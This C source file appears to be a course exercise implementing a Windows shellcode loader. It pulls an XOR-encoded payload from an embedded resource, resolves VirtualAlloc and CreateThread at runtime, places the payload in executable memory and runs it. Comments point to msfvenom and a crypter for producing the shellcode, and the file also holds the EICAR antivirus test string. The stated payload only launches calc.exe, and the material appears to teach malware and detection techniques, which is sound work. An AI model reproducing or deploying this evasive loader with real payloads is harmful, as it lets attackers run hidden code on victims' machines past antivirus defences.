//EDU for xor shellcode

#include <Windows.h>
#include <stdio.h>
#include "resource.h"

//------------------------------------------------------------------------------------------//
// DO NOT TOUCH THIS STUFF BELOW HERE
typedef LPVOID(WINAPI* fnVirtualAlloc)(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
typedef LPVOID(WINAPI* fnCreateThread)(LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, __drv_aliasesMem LPVOID lpParameter, DWORD dwFlags, LPDWORD lpThreadId);
const char* test_string = "UniOffenburg2025";
void test_func() {
	OutputDebugStringA(test_string);
}
// DO NOT TOUCH THIS STUFF ABOVE HERE
//------------------------------------------------------------------------------------------//









// ROT13
void rot13(char* str) {
	// Iterate through each character of the string until the null terminator is reached.
	for (int i = 0; str[i] != '\0'; i++) {
		char c = str[i]; // Get the current character.

		// Check if the character is an uppercase letter (A-Z).
		if (c >= 'A' && c <= 'Z') {
			// Apply ROT13: (character - 'A' + 13) % 26 + 'A'
			str[i] = ((c - 'A' + 13) % 26) + 'A';
		}
		// Check if the character is a lowercase letter (a-z).
		else if (c >= 'a' && c <= 'z') {
			// Apply ROT13: (character - 'a' + 13) % 26 + 'a'
			// This formula shifts the character by 13 positions within the alphabet
			// and wraps around if it goes past 'z'.
			str[i] = ((c - 'a' + 13) % 26) + 'a';
		}
	}
}
//XOR
void XorShellcode(IN PBYTE pShellcode, IN SIZE_T dwSize, IN BYTE bKey)
{
	for (SIZE_T i = 0; i < dwSize; i++)
	{
		pShellcode[i] = pShellcode[i] ^ bKey;
	}
}


int main() {
	//------------------------------------------------------------------------------------------//
	// DO NOT TOUCH THIS STUFF BELOW HERE
	test_func();
	// DO NOT TOUCH THIS STUFF ABOVE HERE
	//------------------------------------------------------------------------------------------//


	// Show the user a message
	const char* eicar = "X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*";
	MessageBoxA(NULL, eicar, "Fancy looking string : )", MB_OK | MB_ICONINFORMATION);

	// Shellcode to launch calc.exe; encode with SimpleCrypter if needed and uncomment the function
	// https://github.com/keks411/SimpleCrypter
	//msfvenom -p windows/x64/exec CMD=calc.exe -f c
	

	//prepare payload and take it from rsrc
	HRSRC		hRsrc = NULL;
	HGLOBAL		hGlobal = NULL;
	PVOID		pPayloadAddress = NULL;
	SIZE_T		sPayloadSize = NULL;
	hRsrc = FindResourceW(NULL, MAKEINTRESOURCEW(IDR_RCDATA1), RT_RCDATA);
	if (hRsrc == NULL) {
		printf("[!] FindResourceW Failed With Error : %d \n", GetLastError());
		return -1;
	}
	hGlobal = LoadResource(NULL, hRsrc);
	if (hGlobal == NULL) {
		printf("[!] LoadResource Failed With Error : %d \n", GetLastError());
		return -1;
	}
	pPayloadAddress = LockResource(hGlobal);
	if (pPayloadAddress == NULL) {
		printf("[!] LockResource Failed With Error : %d \n", GetLastError());
		return -1;
	}
	sPayloadSize = SizeofResource(NULL, hRsrc);
	if (sPayloadSize == NULL) {
		printf("[!] SizeofResource Failed With Error : %d \n", GetLastError());
		return -1;
	}

	// Allocate memory for shellcode using VirtualAlloc
	HANDLE hVirtualAlloc;
	SIZE_T dwSize = sPayloadSize;
	//prepare api-stuff via runtime resolution
	fnVirtualAlloc pVirtualAllocFunc = GetProcAddress(GetModuleHandleA("kernel32.dll"), "VirtualAlloc");
	printf("Press Enter to allocate and execute shellcode...\n");
	getchar();
	hVirtualAlloc = pVirtualAllocFunc(NULL, dwSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (hVirtualAlloc == NULL) {
		printf("[-] VirtualAlloc failed. Error: %lu\n", GetLastError());
		return 1;
	}
	else {
		printf("[+] VirtualAlloc succeeded. Address: %p\n", hVirtualAlloc);
	}

	// Copy shellcode to allocated memory
	printf("Press Enter to copy shellcode into new area...\n");
	getchar();
	if (memcpy(hVirtualAlloc, pPayloadAddress, dwSize) == NULL) {
		printf("[-] memcpy failed. Error: %lu\n", GetLastError());
		return 1;
	}
	else {
		printf("[+] memcpy succeeded.\n");
	}

	// Xor decode shellcode
	printf("Press Enter to xor decode shellcode...\n");
	getchar();
	XorShellcode(hVirtualAlloc, dwSize, 0x69);

	// Create a thread to execute the shellcode
	printf("Press Enter to create a new thread...\n");
	getchar();
	fnCreateThread pCreateThreadFunc = GetProcAddress(GetModuleHandleA("kernel32.dll"), "CreateThread");
	HANDLE hThread = pCreateThreadFunc(NULL, 0, (LPTHREAD_START_ROUTINE)hVirtualAlloc, NULL, 0, NULL);
	if (hThread == NULL) {
		printf("[-] CreateThread failed. Error: %lu\n", GetLastError());
		return 1;
	}
	else {
		printf("[+] CreateThread succeeded. Thread Handle: %p\n", hThread);
	}
	WaitForSingleObject(hThread, INFINITE);

	return 0;

}